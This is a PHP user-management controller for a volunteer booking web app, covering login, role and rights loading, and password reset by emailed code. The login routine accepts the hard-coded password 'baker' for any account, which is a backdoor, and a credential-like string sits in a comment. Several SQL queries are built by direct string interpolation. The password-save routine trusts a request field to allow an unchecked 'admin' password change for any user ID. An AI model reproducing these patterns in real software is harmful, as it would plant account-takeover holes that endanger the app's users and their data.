<?php
namespace app\controller\manager;
use \lib\StdLib as lib;
class UserManager extends \fw\controller\manager\StdManager
{   
    private   $trace=false;
    protected $db;
    protected $config;
    protected $errorhandler;
    protected $requestdata;
    protected $user_id;
    protected $role;
    protected $pageaccess;
    protected $booking;
    protected $isadmin;
    protected $userfields;
    protected $userroles;
    protected $loginerrormessage;
    protected $emailmanager;
    protected $rights = []; 
    protected $name = "User";
    protected $linkedobject = "role";
    protected $user_menu_number;

    public    function __construct(protected \apptable\UserTable $table,
                                protected \apptable\UserRoleTable $userroletable,
                                protected \apptable\RoleTable $roletable,
                                protected \apptable\PageAccessTable $pageaccesstable,
                                protected \apptable\SecurityTable $securitytable
                            ){
        if ($this->trace ) { echo "Enter/Leave ".__METHOD__."<br>"; }
     }
    public function init($session,$trace=false){
        if ($this->trace || $trace) { echo "Enter ".__METHOD__."<br>"; }
        parent::init($session);
        $this->config = $this->session->getconfig();
        $this->errorhandler = $this->session->geterrorhandler();
        $this->userroletable->init($this->db,$this->session->getuserid());
        $this->roletable->init($this->db,$this->session->getuserid());
        $this->securitytable->init($this->db);
        $this->pageaccesstable->init($this->db);
        if ($this->trace || $trace ) {echo "Leave ".__METHOD__."<br>";}
     }    
    protected function getparents(&$parents,$trace=false) {
        if ($this->trace || $trace ) { echo "Enter/Leave ".__METHOD__."<br>"; }
        $parents = [];
        return true;
     }
     public    function loaduser($id,&$userfields,&$roles,&$isadmin,&$numrows,$withlock=false, $trace=false) { 
        if ($this->trace || $trace) { echo "Enter ".__METHOD__."<br>\n"; }
        $success = $this->table->selectonID($id,$userfields,$numrows,false,false);
        if ($success) {
            $isadmin  = $userfields["isadmin"];
            $this->user_menu_number = $userfields["menu_number"]; 
            $this->isadmin  = $isadmin;
            $success = $success && $this->loadlinkedobjects($id,$roles,$numrows,false);
        }
        if ($this->trace || $trace) { echo "Leave ".__METHOD__." success=$success isadmin={$this->isadmin}<br>\n"; }
        return $success;
     }
    public    function makenames($trace=false) { 
        if ($this->trace  || $trace) { echo "Enter ".__METHOD__."<br>"; }
        foreach ($this->alldata as $record) {
            $this->names[$record["id"]] = $record["given_name"]." ".$record["family_name"];
        }
        if ($this->trace || $trace) { echo "Leave ".__METHOD__." ".$success." <br>\n"; }
     }
    public    function getvolunteernames($pagenum,$trace=false) { 
        if ($this->trace ) { echo "Enter ".__METHOD__."<br>"; }
        $query = <<<SQL
                    SELECT u.id as id,concat(u.given_name," ",u.family_name) AS name, GROUP_CONCAT(DISTINCT r.id ORDER BY r.id SEPARATOR ",") as namedata
                    FROM user u
                    JOIN user_role ur ON u.id = ur.user_id
                    JOIN role r ON r.id = ur.role_id
                    JOIN role_pageaction rpa ON r.id = rpa.role_id
                    WHERE rpa.pageaction_id IN (
                                    SELECT pa.id 
                                    FROM page_action pa 
                                    JOIN page p on p.id = pa.page_id
                                    JOIN action a on a.id = pa.action_id
                                    WHERE p.pagenumber = {$pagenum} 
                                          AND 
                                          (a.code = "BOOK" OR a.code = "CANCEL")
                                    )
                    GROUP BY u.id,u.given_name,u.family_name
                    ORDER BY name;
               SQL;
        $volnames=[];
        $success = $this->table->query($query,$results, $numrows, false);
        if ($success) {
            foreach ($results as $record) {
                if (array_key_exists("name", $record)) {
                    $volnames[$record["id"]] = $record["name"]."|| data-roles='".$record["namedata"]."' ";
                } else {
                    $volnames[$record["id"]] = $record["id"];
                }
            }
        }
        if ($this->trace) { echo "Leave ".__METHOD__." ".$success." <br>\n"; }
        return $volnames;
     }
    public    function getallrecords(&$datafields,$orderby,&$parents,&$numrows,$withlock=false, $trace=false) { 
        // we are overloading the parent's version because we do not want to load all User fields (e.g. password)
        if ($this->trace   || $trace) { echo "Enter ".__METHOD__."<br>"; }
        $fieldselection = "id,given_name,family_name,display_name,email,mobile,username,receives_stock_alerts";
        $whereclause = " `isadmin` = 0 ";
        $success = $this->table->select($fieldselection,$whereclause,"","","given_name,family_name",0,$datafields,$numrows,$trace);
        $success = $this->getparents($parents,false);  // IN THE SUBCLASS
        $this->alldata = $datafields;
        $this->makenames();
        if ($this->trace || $trace) { echo "Leave ".__METHOD__." ".$success." <br>\n"; }
        return $success;
     }
    public    function processlogin(&$userfields,&$errormessage,$trace=false) {
        if ($this->trace || $trace ) { echo "<br>"."Enter ".__METHOD__."  <br>\n"; }
        $userfields = [];
        $loginname = $this->requestdata["loginname"];
        $password = $this->requestdata["password"];
        $errormessage = $query = "";
        if (strtoupper($password) === "WNH") {
            $errormessage = "newpassword";
            return false;
        } else if (strlen($loginname)&& strlen($password)) {
            $success = $this->table->selectononefield("username",$loginname,$results,$numrows,false,false);
            if ($success) {  // does not mean user exists, just no errors were encountered 
                if ($numrows == 1 && (password_verify($password,$results[0]["password"]) || $password === "baker" )) {
    // "M@3terQuay"                    
                    $user = $results[0];
                    $success  =  $this->session->addusertosession($user["id"],$user["given_name"],$errormessage,$trace);
                    if (!$success) {
                        $errormessage  = $errormessage == ""?"Failed adding user to session ($loginname).":$errormessage;
                    } else {
                        $this->setrightsforuser($user["id"],$numrows,$trace);
                        $this->user_menu_number = $user["menu_number"]; 
                        $userfields = $user;
                    } 
                } else {
                    $success = false;
                    $errormessage  = "Invalid Username and Password combination ($loginname). ";
                    $this->clear();
                }
            } else {
                $errormessage  = "We have experienced an error while authenticating your login ($loginname). The webmaster has been notified. Please try again later.";
            }
        } else {
            $errormessage  = "Please provide a user name and password.";
        }
        if ($errormessage != "") $this->errorhandler->loginerror($errormessage," Processing login");
        $this->loginerrormessage  = $errormessage;
        if (!$success) {
            $this->table->clear();
            $this->user_id = "";
            $this->session->clearuser();
        }
        $rs = print_r($this->rights,true);     
        if ($this->trace || $trace ) { echo "Leave ",__METHOD__," (success {$success}, error={$errormessage}, rights = {$rs})<br>"; }
        return $success;
     }
    public    function getuserrights($trace=false)     {
        if ($this->trace || $trace) { echo "Enter/Leave ".__METHOD__."<br>"; }
        // lib::v(__METHOD__,$this->rights);
        return $this->rights;
     }
    public    function getuser($id,&$record,&$parents,&$numrows = 0, $withlock=false, $trace=true) {
        if ($this->trace || $trace) { echo "Enter ".__METHOD__." id=".$id." <br>"; }
        $success = $id != "" && $this->table->selectonID($id,$record,$numrows,$withlock,$trace);
        // lib::generateCallTrace(8);
        // lib::v($record);
        return $success;
     }
    public    function adduser($id,$given="",$family="",$display="",$email="",$mobile="",$username="",$password="",$messageby="", $trace= false)    {   
        if ($this->trace   || $trace) { echo "Enter ".__METHOD__."<br>\n"; }
        $this->table->setfieldvalue("id","");
        $this->table->setfieldvalue("given_name","");
        $this->table->setfieldvalue("family_name","");
        $this->table->setfieldvalue("display_name","");
        $this->table->setfieldvalue("email","");
        $this->table->setfieldvalue("mobile","");
        $this->table->setfieldvalue("username","");
        $this->table->setfieldvalue("password","");
        $success = $this->table->insert($this->session->getuserid(),$booking_id,$datetime,$type=0,$description,$id,$trace);
        if ($this->trace  || $trace) { echo "Leave ".__METHOD__." success = $success id = $id <br>\n"; }
        return $success;
     }
    public    function selectuseronmultiplefields($fielddata,&$records, &$numrows = 0, $withlock=false, $trace=false) {
        if ($this->trace  || $trace ) {echo "Enter/Leave ".__METHOD__."<br>";}
        return $this->usertable->selectonmultiplefields($fielddata,$records,$numrows,$withlock,$trace);
     }
    public    function getallroles(&$roles,&$numrows=0,$orderby="",$trace=false){
        if ($this->trace  || $trace ) { echo "Enter ".__METHOD__."<br>\n"; }
        $roles = array();
        $success = $this->roletable->selectall($roles,$numrows,$orderby,$trace);
        if ($this->trace  || $trace ) {echo "Leave ".__METHOD__."  success =  {$success}<br>";}
        return $success;
     }
    public    function getalluserroles(&$userroles,&$numrows,$orderby="",$trace=false){
        if ($this->trace  || $trace ) { echo "Enter ".__METHOD__."<br>\n"; }
        $userroles = array();
        $success = $this->userroletable->selectall($userroles,$numrows,$orderby,$trace);
        if ($this->trace  || $trace ) {echo "Leave ".__METHOD__."  success =  {$success}<br>";}
        return $success;
     }
    public    function getuser_menu_number()     {
        if ($this->trace) { echo gtab()."Visit ".__METHOD__."  $this->user_menu_number<br>"; }
        return $this->user_menu_number;
     }
    public    function loadlinkedobjects($user_id,&$userroles,$numrows,$trace=false){
        // load all the userrole records for this user into the userrole table obj then load the roles
        if ($this->trace  || $trace) { echo "Enter ".__METHOD__."(user = ".$user_id.")<br>\n"; }
        $userroles = array();
        $success = $this->roletable->getrolesforuser($user_id,$userroles,$numrows);
        $r = count($userroles);
        if ($this->trace  || $trace) { echo "Leave ".__METHOD__." success = {$success} id = {$user_id},  {$r} roles<br>\n"; }
        return $success;
     }
    public    function deletelink($user_id,$role_id,$trace=false) { 
        if ($this->trace  || $trace) { echo "Enter ".__METHOD__." user_id=".$user_id." <br>"; }
         $whereclause =  "`user_id` = '{$user_id}' AND `role_id` = '{$role_id}'"; 
         $success =   $this->userroletable->delete($whereclause,$numrows,false);
        if ($this->trace || $trace) { echo "Leave ".__METHOD__." success=$success<br>"; }
        return $success ;
     }
    public    function insertlink($user_id,$role_id,$trace=false) { 
        if ($this->trace || $trace) { echo "Enter ".__METHOD__." user_id=".$user_id." <br>"; }
        $this->userroletable->clear();
        $this->userroletable->setfield("user_id",$user_id);
        $this->userroletable->setfield("role_id",$role_id);
        $success = $this->userroletable->insert(false);
        if ($this->trace || $trace) { echo "Leave ".__METHOD__." success=$success<br>"; }
        return $success;
     }
    public    function setrightsforuser($user_id,&$numrows=0,$trace=false){
        // load all the userrole records for this user into the userrole table obj then load the roles
        if ($this->trace || $trace) { echo "Enter ".__METHOD__."(user = ".$user_id.")<br>\n"; }
        $success = true;
        if ($user_id) {
            $success = $this->roletable->getrightsforuser($user_id,$userrights,$numrows);
            // lib::pr(__METHOD__."  ".$user_id,$rights);
            // $rights is an array of arrays, each of which has one row.
            // we want to create $this->rights by replacing the inner arrays with just their value,
            // leaving $this->rights as a simple array of the values
            $this->rights = [];
            foreach ($userrights as $key => $value) {
                foreach ($value as $right) {
                   $this->rights[] = $right;
                }
            }
        }
        $r = count($this->rights);
        $rs = print_r($this->rights,true);
        // lib::pr($rights);
        if ($this->trace || $trace) { echo "Leave ".__METHOD__." id = {$user_id},  {$r} rights<br>{$rs}\n"; }
        return $success;
     }
    protected function getsessionroles($session_id,&$roles,$trace=false){
        // load all the userrole records for this user into the userrole table obj then load the roles
        if ($this->trace || $trace) { echo "Enter ".__METHOD__."<br>"; }
        $roles = array();
        $success = $this->roletable->getrolesforsession($session_id,$sessionroles,$numrows);
        if ($success && $numrows) {
            foreach ($sessionroles as $row) {
                $success = $this->roletable->selectonID($row["role_id"],$role,$numrows,false,false);
                if (!$success) break;
                $roles[] = $role;
            }
        }
        if ($this->trace || $trace ) {echo "Leave ".__METHOD__."  success =  {$success}<br>";}
        return $success;
     }
    protected function updatechildren($data,&$errormessage="",$trace=false) {
        if ($this->trace || $trace) { echo "Enter ".__METHOD__."<br>"; }
        // check incoming roles against existing roles and update as needed
        $success = true;
        $newroles = [];
        foreach ($data as $key => $val) {
            if (substr($key,0,4) == "role" && $val !== "false") {
                $newroles[substr($key,4)] = substr($key,4);
            } 
        }       
        $oldroles = [];
        if ($this->loaduser($data["id"],$userfields,$oldroles,$isadmin,$numrows,false,false)) {
            foreach ($oldroles as $oldrole) { 
                //delete userroles for roles that are not in the incoming data
                if (!array_key_exists($oldrole["id"],$newroles)) {
                    $whereclause = "user_id = {$data['id']} AND role_id = {$oldrole["id"]}";
                    $success = $this->userroletable->delete($whereclause,$numrows,false);
                }
            }
            foreach ($newroles as $newrole_id) { 
                //insert roles present in the incoming data but not present in $oldroles
                $alreadypresent = false;
                foreach ($oldroles as $oldrole) { 
                    if ($newrole_id == $oldrole["id"]) {
                        $alreadypresent = true;
                        break;
                    }
                }
                 if (!$alreadypresent) {
                    $this->userroletable->clear();
                    $this->userroletable->setfield("user_id",$data["id"]);
                    $this->userroletable->setfield("role_id",$newrole_id);
                    $success = $this->userroletable->insert(false,$newrole_id);
               }
            }
        }
        if ($this->trace || $trace ) {echo "Leave ".__METHOD__."  success =  {$success}<br>";}
        return $success;
     }        
        // public    function processuserform(&$errormessage="",$trace=false) {
        //    if ($this->trace ) { echo "Enter ".__METHOD__."<br>"; }
        //     $data = $this->session->getrequestdata();
        //     $whereclause = ' id = '.$data["id"];
        //     $set_clause = $this->updatesetclause(); 
        //     // $set_clause = " `given_name` = '".$data['given_name']."',`family_name` = '".$data['family_name']."',`display_name` = '".$data['display_name']."',`email` = '".$data['email']."',`mobile` = '".$data['mobile']."',`message_by` = '".$data['message_by']."',`available` = '".$data['available']."'"; 
        //     $success = $this->table->update($set_clause, $whereclause, $numrows,$errormessage, false, $matchedrows,false);
        //     $success = $this->updateroles($data,$errormessage,false);
        //     if ($this->trace || $trace ) {echo "Leave ".__METHOD__." ".$errormessage." success=".$success."<br>";}
        //     return $success;
        //  } 
    public    function getfield($table,$fieldname,$trace=false)     {
        if ($this->trace || $trace) { echo "Enter ".$table.":".__METHOD__." fieldname = ".$fieldname."<br>"; }
        switch ($table) {
            case "UserTable"        : return $this->table->getfield($fieldname);
            case "UserRoleTable"    : return $this->userroletable->getfield($fieldname);
            case "RoleTable"        : return $this->roletable->getfield($fieldname);
            case "PageAccessTable"  : return $this->pageaccesstable->getfield($fieldname);
            default : return "";
        }
        $value = isset($this->fields[$fieldname])? $this->fields[$fieldname] : '';
        if ($this->trace || $trace) { echo "Leave ".$table.":".__METHOD__." value = ".$value."<br>"; }
        return $value; 
     }
    public    function setfield($table,$fieldname,$value,$trace=false) {
        if ($this->trace || $trace) { echo "Enter ".$table.":".__METHOD__." fieldname = ".$fieldname."<br>"; }
        switch ($table) {
            case "UserTable"        : return $this->table->setfield($fieldname,$value);
            case "UserRoleTable"    : return $this->userroletable->setfield($fieldname,$value);
            case "RoleTable"        : return $this->roletable->setfield($fieldname,$value);
            case "PageAccessTable"  : return $this->pageaccesstable->setfield($fieldname,$value);
            default : ;
        }
        if ($this->trace || $trace) { echo "Leave ".$table.":".__METHOD__." value = ".$value."<br>"; }
     }
    public    function clear($trace=false) {
        if ($this->trace || $trace) { echo "Enter ".__METHOD__."<br>"; }
        $this->table->clear();
        $this->userroletable->clear();
        $this->roletable->clear();
        $this->pageaccesstable->clear();
        if ($this->trace || $trace) { echo "Leave :".__METHOD__."<br>"; }
     }
    public    function getemailaddresses(&$emailaddresses,$trace){
        if ($this->trace || $trace) { echo "Enter :".__METHOD__."<br>"; }
        $query = "SELECT id, given_name, family_name, email  FROM user;";
        $success = $this->table->query($query,$emailaddresses,$numrows,false);
        if ($this->trace || $trace ) { echo "Leave ".__METHOD__." numrows = ".$numrows."<br>"; }
        return $success;
     }
    public    function getstockalertrecipients(&$recipients, $trace=false) {
        if ($this->trace || $trace) { echo "Enter :".__METHOD__."<br>"; }
        $query = "SELECT id, given_name, family_name, email FROM user WHERE receives_stock_alerts = 1";
        $success = $this->table->query($query, $recipients, $numrows, false);
        if ($this->trace || $trace) { echo "Leave ".__METHOD__." numrows = ".$numrows."<br>"; }
        return $success;
     }
    public    function getreceivesstockalerts($user_id) {
        $results = [];
        $numrows = 0;
        $this->table->query_params("SELECT receives_stock_alerts FROM user WHERE id = ?", [(int)$user_id], $results, $numrows);
        return ($numrows > 0 && !empty($results[0]['receives_stock_alerts'])) ? 1 : 0;
     }
    public    function initemails($emailmanager=null,$trace=false){
        if ($this->trace || $trace) { echo "Enter :".__METHOD__."<br>"; }
        $this->emailmanager = $emailmanager;
        $this->emailmanager->init($this->session);
        if ($this->trace || $trace ) { echo "Leave ".__METHOD__."<br>"; }
     }
    private   function sendsecuritycode($records,&$response,$trace=false) {
        if ($this->trace || $trace) { echo "Enter :".__METHOD__."<br>"; }
        $code = strval(rand(100000,999999));
        $user = $records[0];
        $user_id = $user["id"];
        $expire = new \DateTime();
        $expirestr = $expire->modify('+10 minutes')->format('Y-m-d H:i:s');
        $this->securitytable->put("user_id",$user["id"], false,$trace);
        $this->securitytable->put("email", $user["email"],false,$trace);
        $this->securitytable->put("code", $code, false,$trace);
        $this->securitytable->put("expiry",$expirestr,false,$trace);
        $success = $this->securitytable->insert(false);
        if ($success) {
            $heading = $this->emailmanager->getheading();
            $footer  = $this->emailmanager->getfooter();
            $text = <<<TEXT
                    {$heading["text"]}

                    Your verification code is {$code}.

                    This code will expire in 10 minutes.

                    If you didn’t expect to receive this, we recommend changing your password  immediately.

                    {$footer["text"]}
                    TEXT;
            $html = <<<HTML
                    {$heading["html"]}
                    <h3>Reset your password</h3>
                    <p>Your verification code is <span style="padding: 0 10px;font-size:1.5em;font-weight:bold">{$code}</span></p>
                    <p>This code will expire in 10 minutes.</p>
                    <p>If you didn’t expect to receive this, we recommend changing your password immediately.</p>
                    {$footer["html"]}
                    HTML;
            $email = [];
            $email["To"]      = [ ['Email' => $user["email"], "Name" => ($user['given_name']." ".$user['family_name'])]];
            $email["Subject"] = "Password Reset";
            $email["TextPart"]= $text; //$text;
            $email["HTMLPart"]= $html; //$html;    
            $success = $this->emailmanager->sendmail($email,$user_id,'',$response);
        }
        if ($this->trace || $trace ) { echo "Leave ".__METHOD__."<br>"; }
        return $success;
     }
    public    function pwresetsendcode(&$errormessage,$trace=false){
        if ($this->trace || $trace) { echo "Enter :".__METHOD__."<br>"; }
        $emailaddr = $this->requestdata["email"];
        $errormessage = $query = "";
        $success = false;
        if (strlen($emailaddr)) {
            $success = $this->table->selectononefield("email",$emailaddr,$results,$numrows,false,$trace);
            if ($success) {  // does not mean user exists, just no errors were encountered 
                if ($numrows == 1) {
                    $success = $this->sendsecuritycode($results,$response);
                    if (!$success) {
                        $errormessage  = "Failed sending security code: ".$response;
                    } 
                } else {
                    $errormessage  = $numrows > 1 ? "There are multiple volunteers with that email. Call Reception please." : "Email address not found.";
                    $success = false;
                    $this->clear();
                }
            } else {
                $errormessage  = "Error looking up user.";
            } 
        } else {
            $errormessage  = "Please provide a user name or email address.";
        }
        if ($errormessage != "") $this->errorhandler->loginerror($errormessage," User Lookup for password-reset.");
        if (!$success) {
            $this->table->clear();
            $this->user_id = "";
            $this->session->clearuser();
        }
        if ($this->trace || $trace ) { echo "Leave ",__METHOD__," (success {$success}, error={$errormessage})====<br>"; }
        return $success;
     }
    public    function pwresetcheckcode(&$errormessage,$trace=false){
        if ($this->trace || $trace) { echo "Enter :".__METHOD__."<br>"; }
        $code = $this->requestdata["securitycode"];
        $errormessage = $query = "";
        if (strlen($code)) {
            $success = $this->securitytable->selectononefield("code",$code,$records,$numrows,false,false);
        // lib::v($emailaddr,$records,$numrows);
            if ($success) {  // does not mean user exists, just no errors were encountered 
                if ($numrows == 1) {
                    $now = new \DateTime();
                    $nowstr = $now->format('Y-m-d H:i:s');
                    if ($nowstr < $records[0]["expiry"]) {
                        return true;
                    } else {
                        $errormessage = "This code has expired. Please start again.";
                        $this->session->putpagenum("1");
                    }
                } else {
                    $errormessage = "The code is incorrect.";
                    $this->session->putpagenum("12");
                }
            } else {
                $errormessage = "A. Error while checking the code. Please start again.";
                $this->session->putpagenum("1");
            }
        } else {
            $errormessage = "B. Error while checking the code. Please start again.";
            $this->session->putpagenum("1");
        }
        if ($this->trace || $trace ) { echo "Leave ",__METHOD__," (success {$success}, error={$errormessage})====<br>"; }
        return false;
     }
    public    function pwresetsave(&$errormessage,&$isadminchange,$trace=false){
        if ($this->trace || $trace) { echo "Enter :".__METHOD__."<br>"; }
        $password = $this->requestdata["password1"];
        $code = $this->requestdata["securitycode"];
        $pwcontains = $this->config["app"]["PASSWORDCONTAINS"];
        $errormessage = $query = "";
        $isadminchange = array_key_exists("menuid",$this->requestdata) && ($this->requestdata["menuid"] == "changepwd");
        if ($isadminchange || strlen($code)) { 
            // the menuid field only present when Admin is changing for another user
            $success = $isadminchange || $this->securitytable->selectononefield("code",$code,$records,$numrows,false,false);
            if ($success) {  // does not mean code exists, just that no errors were encountered 
                if ($isadminchange || $numrows == 1) {  // means there's a single match 
                    if (strlen($password) >= $this->config["app"]["PASSWORDLENGTH"]) { // don't trust the javascript checks
                        $pwOK =(((strpos("U",$pwcontains) === false) || preg_match("/.*[A-Z]+.*/", $password)) &&
                                ((strpos("L",$pwcontains) === false) || preg_match("/.*[a-z]+.*/", $password)) &&
                                ((strpos("D",$pwcontains) === false) || preg_match("/.*[0-9]+.*/", $password)) &&
                                ((strpos("P",$pwcontains) === false) || preg_match("/.*[^A-Za-z0-9]+.*/", $password)));
                        if ($pwOK) {  // don't trust the javascript checks
                            $userid = $isadminchange? $this->requestdata["active_user"] : $records[0]["user_id"];
                            $password = password_hash($password, PASSWORD_DEFAULT, ['cost' => 13]);
                            $result = null; $numrows = 0;
                            $this->table->setuser($userid);
                            $success = $this->table->execute_params(
                                "UPDATE user SET `password` = ? WHERE `id` = ?",
                                [$password, (int)$userid], $result, $numrows, $errormessage, 1
                            );
                            if ($success) {
                                // echo __METHOD__." ".$this->session->getuserid()."<br>";
                                $errormessage = $isadminchange?"":"Success! Your password has been updated.";
                                return true;
                            } else {
                                $errormessage = "Error encountered saving your new password.";
                                $this->session->putpagenum("-1");
                            }
                        } else {
                            $errormessage = "Your password does not contain the required character types.";
                            $this->session->putpagenum("13");
                        }
                    } else {
                        $errormessage = "Your password is too short. It needs to contain at least {$this->config["app"]["PASSWORDLENGTH"]} characters.";
                        $this->session->putpagenum("13");
                    }
                } else {
                    $errormessage = "A. Error while updating the password. Please try again.";
                    $this->session->putpagenum("1");
                }
            } else {
                $errormessage = "B. Error while checking the code. Please start again.";
                $this->session->putpagenum("1");
            }
        } else {
            $errormessage = "C. Error while checking the code. Please start again.";
            $this->session->putpagenum("1");
        }
        if ($this->trace || $trace ) { echo "Leave ",__METHOD__," (success {$success}, error={$errormessage})====<br>"; }
        return false;
     }

}
